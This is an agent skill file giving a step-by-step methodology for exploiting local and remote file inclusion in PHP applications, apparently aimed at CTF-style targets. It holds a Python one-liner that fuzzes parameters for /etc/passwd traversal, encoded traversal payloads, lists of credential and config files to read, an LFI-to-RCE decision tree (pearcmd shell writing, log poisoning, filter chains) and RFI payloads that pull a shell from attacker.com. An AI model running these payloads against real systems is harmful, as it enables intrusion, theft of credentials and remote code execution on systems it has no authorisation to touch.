---
name: lfi-rfi-methodology
description: "Detection and exploitation of local file inclusion (LFI), remote file inclusion (RFI), and arbitrary file read. Use when the target has file inclusion parameters (page/file/include/lang), is a PHP application, or has writable log files. Covers the file_exists() trap, PHP include() syntax error diagnostics, correct log poisoning payloads, pearcmd.php exploitation, PHP filter chain RCE, and session file inclusion race conditions"
zh-signals: "检测与利用本地/远程文件包含及任意文件读取，涵盖 file_exists 陷阱、日志投毒、pearcmd 与 PHP filter chain RCE。信号:LFI,RFI,文件包含,日志投毒,任意文件读取"
when-to-use: >-
  Use when a target has file inclusion parameters (page/file/include/lang), is a PHP app, or
  has writable log/session files that may lead to LFI-to-RCE.
metadata:
  tags: "lfi,rfi,file inclusion,file-inclusion,local file inclusion,path-traversal,rce,log-poisoning,directory traversal,file inclusion,php://filter,data://,expect://,proc/self,etc/passwd,pearcmd,auto_prepend,file read,arbitrary file read"
  category: "exploit"
---

# File Inclusion Vulnerability Methodology (LFI/RFI)


## ⛔ Deep Reference (Must Read After Confirming LFI)

- Full log poisoning steps, PHP wrappers, session file inclusion, include() trap diagnostics → [references/lfi-to-rce.md](references/lfi-to-rce.md)
- pearcmd.php exploitation, PHP filter chain RCE, session race conditions → also in [references/lfi-to-rce.md](references/lfi-to-rce.md)
- Detailed LFI-to-RCE privilege escalation paths → [references/lfi2rce-techniques.md](references/lfi2rce-techniques.md)

---

## ⛔ Phase 0: Page Discovery (Prerequisite for LFI Testing!)

**You must first find all accessible pages before testing LFI.**

1. Use `ffuf` / `spray` to scan `.php/.html`; if that fails, immediately fall back to batch testing with python3 requests:
```
private.php, admin.php, secret.php, flag.php, test.php, debug.php, panel.php, dashboard.php,
upload.php, api.php, config.php, backup.php, shell.php, cmd.php, exec.php, portal.php,
manage.php, internal.php, hidden.php, restricted.php, secure.php, system.php, info.php,
phpinfo.php, setup.php, install.php, download.php, view.php, file.php, read.php, include.php
```
2. Record every page that returns 200 with non-empty content → these are the LFI test targets

## Phase 1: Discover File Inclusion Points

⛔ **Exit condition**: if an endpoint shows no response difference across 3+ parameters (length difference < 10 bytes) → mark it "No LFI" → move to another endpoint

### ⛔ Parameter Fuzzing (All at Once — Manual One-by-One Testing Is Forbidden!)

Use Python to batch test all common parameters (still enumerating parameters after 3 rounds = violation):
```
python3 -c "import requests;[print(f'FOUND: {p}?{param}') for p in ['private.php','index.php','page.php','view.php','file.php','read.php'] for param in ['file','page','path','include','doc','template','lang','module','view','load'] if 'root:' in requests.get(f'http://TARGET/{p}?{param}=../../../etc/passwd',timeout=3).text]"
```
- When using ffuf for parameter fuzzing: the wordlist must be `Web/CTF/Fuzz_param.txt` (not a directory wordlist!)
- Do not test only the file parameter: the id parameter may also have LFI
- URL encoding bypass: `..%2f`, `%2e%2e%2f` bypasses path filters

Common parameter names: `file`, `page`, `path`, `include`, `doc`, `template`, `lang`, `module`, `action`, `view`

Test vectors:
```
?file=../../../etc/passwd
?file=../../../etc/passwd%00       (PHP < 5.3.4)
?file=..%252f..%252fetc%252fpasswd (double encoding)
```

**Verification method**: compare the response length/content with and without the parameter; a difference = the parameter is valid

## Phase 2: Path Traversal Testing
```
Increase the number of ../ levels step by step (usually 4-7 levels to reach the root):
?file=../../../../etc/passwd
```

## Phase 3: Key File Reads

### ⛔ Dockerfile/Source Code First Path Rule
When the Dockerfile or the application source code has been obtained:
1. Extract the `WORKDIR` value (e.g. `/var/www/html/`)
2. Extract the flag filename (e.g. `xbow-flag.txt`)
3. **Concatenate WORKDIR + filename as the highest-priority read path** (e.g. `/var/www/html/xbow-flag.txt`)
4. ⛔ Never skip a known path to blindly guess `/app/flag.txt`, `/flag`, etc.

**Linux**: `/etc/passwd`, `/proc/self/environ`, `/var/log/apache2/access.log`
**Windows**: `C:\Windows\win.ini`, `C:\inetpub\wwwroot\web.config`
**Web application**: `config.php`, `.env`, `wp-config.php`
**Source code**: `php://filter/convert.base64-encode/resource=index`

### PHP File Inclusion Traps
- Directly including a .php file does not show the source code, it only executes the code
- To read PHP source code you must use `php://filter/convert.base64-encode/resource=xxx`

## Phase 4: LFI → RCE Decision Tree

⛔ **Log poisoning priority trigger condition**: when the task description/challenge name contains the keywords `poison` or `log` (or their equivalents in any other language), **skip the wrapper attempts and go straight to the log poisoning flow**!

```
LFI confirmed
│   ├─ ⛔ Does the challenge contain the "poison"/"log" keyword? → go straight to log poisoning (skip the second half of Phase 3)
│   ├─ Is the target PHP + include()?
│   │   ├─ Does pearcmd.php exist? → write a shell with pearcmd (fastest, no log/session dependency)
│   │   ├─ No file_exists() check? → php://input / data:// wrapper
│   │   ├─ file_exists() check present? → wrappers unavailable! Use log poisoning or a PHP filter chain
│   │   ├─ Session functionality present? → Session file inclusion (inject PHP code into the session, e.g. the username field, and include the session file to execute it)
│   ├─ Log poisoning (most universal)
│   │   ├─ Inject PHP code via the User-Agent
│   │   ├─ ⚠️ Never use system('cat /file.php')! Use file_get_contents() + echo
│   │   └─ Include /var/log/apache2/access.log to trigger it
│   ├─ PHP Filter Chain RCE (no file write/log/session needed)
│   │   └─ Generate the chain with php_filter_chain_generator.py
│   └─ Detailed steps → [references/lfi-to-rce.md](references/lfi-to-rce.md)
```

## Phase 5: RFI Testing
`?file=http://attacker.com/shell.txt` (requires allow_url_include=On) | `?file=\\attacker.com\share\shell.php` (SMB/UNC)

## Notes
- **include() executes PHP, file_get_contents() reads raw text** — the key difference
- LFI is more common than RFI (RFI requires permissive PHP configuration) | HTTP 200 + Content-Length: 0 → the PHP syntax error is swallowed
